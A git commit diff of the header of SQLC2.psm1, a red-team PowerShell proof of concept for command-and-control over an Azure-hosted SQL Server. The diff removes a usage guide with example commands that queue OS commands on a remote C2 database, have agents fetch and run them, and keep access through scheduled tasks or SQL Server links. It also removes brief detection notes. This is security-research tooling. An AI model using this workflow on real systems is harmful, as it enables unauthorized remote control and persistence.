0fb806a2ad4226e27f3c7086eb48d67204c5eaf0
Scott Sutherland <nullbind@users.noreply.github.com>
2018-05-24 00:20:31 -0500

    Update SQLC2.psm1

--- SQLC2.psm1
+++ SQLC2.psm1
@@ -1,5 +1,6 @@
 <#
-	Script:  SQLC2.ps1
+	Script:  SQLC2.psm1
+	Version: 1.0
 	Description: This is a basic PoC script that contains functions that can be 
 		     used to install and manage a C2 via a SQL Server instance.
 		     The C2 SQL Server is intended to be hosted remotely or in Azure 
@@ -9,81 +10,6 @@
 	Author:  Scott Sutherland (@_nullbind), NetSPI 2018
 	License: BSD 3-Clause
 	Mini Guide:
-
-	    ----------------------------
-	    Azure Configuration Overview
-	    ----------------------------
-
-	    1. Create an Azure account and log in.
-
-	    3. Create a SQL server databse. In this example the server will be named sqlcloudc2 and the datatabase will be named database1.
-
-	    4. Add a virtual firewall exception for the target networks that you will be receiving connections from.
-
-	    ----------------------------
-	    Attack Workflow Overview
-	    ----------------------------
-	    1. Install SQLC2.
-
-	    Install C2 tables in remote SQL Server instance. You will need to provide an database that you have the ability to create tables in, or create a new at database.  However, in Azure I've been getting some timeouts which is why you should have already created the target database through Azure.  
-
-	    Example command:
-	    Install-SQLC2Server -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
-
-	    2. Setup OS command.
-
-	    Set a OS command to run on all agent systems.  You can also configure commands to run on a specific agent using the -ServerName paremeter.
-
-	    Example command:
-	    Set-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Command "Whoami"
-
-	    3. List queued commands.
-
-	    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. This will only output the commands, it will not execute them.
-
-	    Example command:
-	    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
-
-	    4. The agent will automatically be registered.  To list the registered agent use the command below.
-
-	     Get-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
-
-	    5. Execute queued commands via PS. This can be scheduled via a WMI subscription or schedule task.
-
-	    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. Including the -Execute flag will automatically run them.  This command could be used in combination with your prefered persistence method such as a scheduled task.
-
-	    Example command:
-	    Get-SQLC2Command -Verbose -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Execute
-		
-	    5a. Execute queued commands via SQL Server link and agent job. This allows you to use an internal SQL Server as your agent.	This requires sysadmin privileges on the internal SQL Server.	
-	    
-	    Install-SQLC2AgentLink -Instance 'InternalSQLServer1\SQLSERVER2014' -C2Username 'CloudAdmin' -C2Password 'CloudPassword!' -C2Instance sqlcloudc2.database.windows.net -C2Database database1 -Verbose 	
-	    
-	    Note:  You can use the command below to remove the server link agent.
-	    
-	    Uninstall-SQLC2AgentLink  -Verbose -Instance 'InternalSQLServer1\SQLSERVER2014'
-
-	    5b. Execute queued commands via a schedule task or other persistence method. This allows you to the local OS as an agent. This requires local administrative privileges.	
-	    
-	    Install-SQLC2AgentPs -Verbose -Instance 'InternalSQLServer1\SQLSERVER2014' -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1
-	    
-	    Note:  You can use the command below to remove the installed agent.
-	    
-	    Uninstall-SQLC2AgentPs -Verbose 
-
-	    6. View command results.
-
-	    The command below can be used to retrieve the command results. By default it shows the entire command history. However, results can be filtered by -Status, -ServerName, and -Cid.
-
-	    Example command:
-	    Get-SQLC2Result -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Status 'success'
-
-	    ----------------------------
-	    Blue Team Datasource Notes
-	    ----------------------------
-	    1. PowerShell logging.
-	    2. EDR showing PowerShell connecting to the internet. Specifically, *.database.windows.net (Azure)
-	    3. EDR showing specific commands being executed such as "Get-SQLC2Comand".
 #>
 
 
